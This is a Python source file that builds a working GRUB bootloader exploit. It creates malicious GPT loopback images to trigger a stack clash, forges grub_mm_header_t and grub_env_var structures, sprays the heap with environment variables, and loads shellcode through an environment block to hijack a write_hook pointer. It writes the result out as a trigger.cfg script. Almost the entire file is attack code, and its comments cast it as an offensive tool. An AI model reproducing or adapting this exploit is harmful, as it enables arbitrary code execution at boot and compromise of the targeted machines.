from gpt import stack
from consts import BANNER, PROBE_DEPTH, MAX_DEPTH, BLOCK_SIZE, SHELLCODE, \
        TRASH_ALLOC, START_DEPTH, END_DEPTH, FUN_COUNT, SPRAY_ENVVAR, \
        SPRAY_CONSTRUCTION, OFFSET_START
from util import command, find_root, grub_print, force_regions_to_exist, \
        VarSplit, RecursiveFuncs, while_loop, hashval, Variable
from fakestructs import grub_mm_header_t, grub_env_var
from envblk import env_block


def probe_body(body, offset=48):
    pre = b'b'*offset
    post = b'c'*64
    spare = BLOCK_SIZE - (len(pre) + len(post))
    rest = body * (spare // len(body))
    to_add = BLOCK_SIZE - (len(rest) + len(pre) + len(post))
    rest += b'\x00' * to_add
    return pre + rest + post


class Primitive:
    """
    The stack clashing primitive.
    """

    def __init__(self, name, body, offset_start=OFFSET_START,
                 max_depth=MAX_DEPTH, debug=False):
        self._max_depth = max_depth
        self._debug = debug
        self._rf = RecursiveFuncs(f'trigger_{name}')
        self._name = name
        self._filename = name
        self._bodies = [
            probe_body(body, offset_start + i)
            for i in range(0, len(body), 8)
        ]

    def count(self):
        return len(self._bodies)

    def setup(self, basepath):
        """
        Pre setup to create the files we need for exploitation.
        """
        for idx, body in enumerate(self._bodies):
            # using it twice to give us a second chance with the protective mbr
            # + final gpt volume.
            blocks = stack(self._max_depth, body, body)
            # padding with one block so we don't trigger the bug automatically
            # with an `ls`
            res = b'b' * BLOCK_SIZE
            res += b''.join(map(bytes, blocks))

            with open(f'{basepath}/{self._filename}_{idx}', 'wb') as f:
                f.write(res)

    def setup_cfg(self):
        """
        Setup that needs to be added to the config.
        """
        res = []
        res += self._rf.setup()
        res += self._rf.define(
            [
                'loopback probe (${base})$1+',
                'search --file does_not_exist',
                'loopback -d probe',
            ]
        )
        return res

    def set_active(self, body_offset):
        """
        Set base to be this specific body offset.
        """
        res = []
        res += command(f'set base={self._name}_{body_offset}')
        res += command('loopback ${base} /x/${base}')
        return res

    def unset_active(self):
        """
        Unset the base.
        """
        res = []
        res += command('loopback -d ${base}')
        res += command('unset base')
        return res

    def destroy(self):
        return [f'loopback -d {self._name}-{i}' for i in range(self.count())]

    def map_depth(self, depth):
        """
        Map the depth to a block we should mount the loopback from.
        """
        assert depth <= self._max_depth
        offset = 1 + (self._max_depth - depth) * 3
        return offset

    def trigger(self, depth, fun=0):
        """
        Trigger the bug at a given depth.

        Option to use fun is to avoid having to nudge the target allocations.
        """
        res = []
        if isinstance(depth, str):
            offset = depth
        else:
            offset = self.map_depth(depth)
        if self._debug:
            res += command('set debug=gpt')
        res += self._rf.call(fun, [str(offset)])
        if self._debug:
            res += command('unset debug')

        return res


def clashgpt(basepath):
    # we use these after we corrupt a grub_env_var with the hashval of 0, so we
    # need to make sure they aren't in the same hashtable entry
    assert hashval('depth_') != 0
    assert hashval('fun') != 0
    assert hashval('curr') != 0
    assert hashval('template') != 0
    assert hashval('found') != 0
    assert hashval('offset') != 0
    assert hashval('base') != 0

    # envblocks give a nice way of introducing our shellcode into memory.
    envblock = env_block({'template': SHELLCODE + b'\n'})
    with open(f'{basepath}/e.dat', 'wb') as f:
        f.write(envblock)

    # Create our overwrite of a `struct grub_env_var`.
    # we can skip most of the struct as most of it doesn't matter, making the
    # exploit more reliable.
    fakeenv = grub_env_var(write_hook=0x30303030)[:8*5]
    teststr = 'Y' * (len(fakeenv) - 1)
    probe_b = grub_mm_header_t(3)
    probe_b += bytes(teststr, 'ascii') + b'\x00'
    probe_b += b'\x00' * (32 - (len(probe_b) % 32))

    # Create the alignment + fake grub_mm_header_t.
    # This is so we can unset the variable and have an free block that will
    # only fit a `struct grub_env_var` and not the other allocations we might
    # generate through normal usage.
    control_b = grub_mm_header_t(3)
    control_b += fakeenv
    control_b += b'\x00' * (32 - (len(control_b) % 32))

    assert len(control_b) == len(probe_b)

    # Setup the two probes.
    probe = Primitive('base', probe_b)
    probe.setup(basepath)

    control = Primitive('over', control_b)
    control.setup(basepath)

    # A way of construction large defined strings by splitting them across
    # multiple variables, merging them together.
    vs = VarSplit(TRASH_ALLOC)

    trigger = []
    trigger += grub_print(BANNER)
    trigger += grub_print('[!] setup')
    trigger += find_root('/x/trigger.cfg', 'root')
    # initial setup things
    trigger += command('load_env -f /x/e.dat template')

    # setup our base.
    trigger += probe.setup_cfg()
    trigger += control.setup_cfg()
    trigger += vs.setup()
    trigger += command('set end=NONE')
    trigger += command('set found=false')

    trigger += vs.define('t_0')

    # We need to force memory pressure so a region exists below the stack.
    trigger += grub_print('[!] Forcing memory pressure')
    trigger += force_regions_to_exist()
    trigger += grub_print('[!] Setting up construction')
    # setup the construction
    for i in range(SPRAY_CONSTRUCTION):
        trigger += vs.define(f'con_{i}')

    # just use the first one, we just want to see if anything is corrupted.
    trigger += probe.set_active(0)
    trigger += probe.trigger(PROBE_DEPTH)
    # now determine which one we corrupted.
    for i in range(SPRAY_CONSTRUCTION):
        trigger += command(
            f'if [ ${{con_{i}}} != ${{t_0}} ] ; then set end=con_{i}; fi'
        )

    trigger += probe.unset_active()
    trigger += grub_print('[!] Corrupting: ${end}')
    trigger += command('if [ ${end} = NONE ] ; then normal_exit ; fi')

    # and now we try to get full control over the env vars value and the struct
    # header.
    # so then we can free it and get an object we fully control here.
    # wrapping this in a while loop so we can break from it early.
    internal = []
    internal += grub_print('[!] Determining Depth')
    for offset in range(probe.count()):
        internal += command(f'set offset={offset}')
        internal += probe.set_active('${offset}')
        for depth in range(START_DEPTH, END_DEPTH):
            internal += command(f'set depth_={probe.map_depth(depth)}')
            for fun in range(FUN_COUNT):
                internal += command(f'set fun={fun:04}')
                internal += probe.trigger(depth, fun)
                internal += command('eval "set curr=\\$${end}"')
                # internal += grub_print('${curr}')
                internal += command(
                    f'if [ "${{curr}}" = {teststr} ]; then set found=true ; break ; fi'
                )
        internal += probe.unset_active()

    internal += command('break')

    trigger += while_loop('${end} != NONE', internal)

    # from this point on we need to be very careful about variable names, as
    # introducing a fake grub_env_var will make some inaccessible.
    # We do not properly set the `next` member, so everything following it in
    # the hash table row is invalid.
    internal = []
    internal += probe.unset_active()
    internal += control.set_active('${offset}')
    internal += grub_print('[!] Found: ${depth_} ${fun} ${curr}')
    internal += grub_print('[!] going for the kill')
    internal += command('unset ${end}')
    # spray grub_env_vars to get one in our free slot
    # using a large name and value so only the `struct grub_env_var` for the
    # variable can end up in the free slot.
    for i in range(SPRAY_ENVVAR):
        internal += Variable(
            f'spray_{i}_'+'A'*96,
            target=0
        ).set('${template}'*128)
    # now we use our controlled overwrite....
    internal += control.trigger('${depth_}', 'fun')
    # to obtain victory
    internal += command('set =1')
    internal += command('break')

    trigger += while_loop('"${found}" != false', internal)
    trigger += grub_print('[!] done')

    with open(f'{basepath}/trigger.cfg', 'w') as f:
        f.write('\n'.join(trigger))
